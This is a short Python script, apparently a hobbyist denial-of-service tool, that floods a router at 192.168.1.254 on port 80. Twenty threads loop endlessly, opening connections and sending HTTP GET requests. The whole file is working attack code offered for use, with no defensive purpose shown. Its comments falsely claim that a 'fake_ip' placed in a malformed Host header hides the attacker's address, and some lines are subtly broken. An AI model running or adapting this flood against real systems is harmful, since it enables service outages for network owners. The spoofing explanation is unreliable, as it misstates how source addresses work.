import threading
import socket

target = '192.168.1.254'
#IP of my router
port = 80
#http port
fake_ip = '10.30.168.167'
#fake ip from which i will attack and this will appear on the netstat of router

connected = 0
#number of connections made to my router

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #attack from sockets
        s.connect((target, port))
        #establishing connection to target from a port 80
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        #sending GET request to connect to target and port we encode the GET request with ascii
        s.sendto(("Host; " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        #we show our IP like fake ip to see it on the router as our real
        s.close()

        global connected
        connected += 1
        if connected % 20 == 0:
            print(connected, "Succesfull Connections!")
            #prints out every 20 succesfull connections made to router

for i in range(20):
    thread = threading.Thread(target=attack)
    thread.start()
    #loop of our attack to keep repeting itself
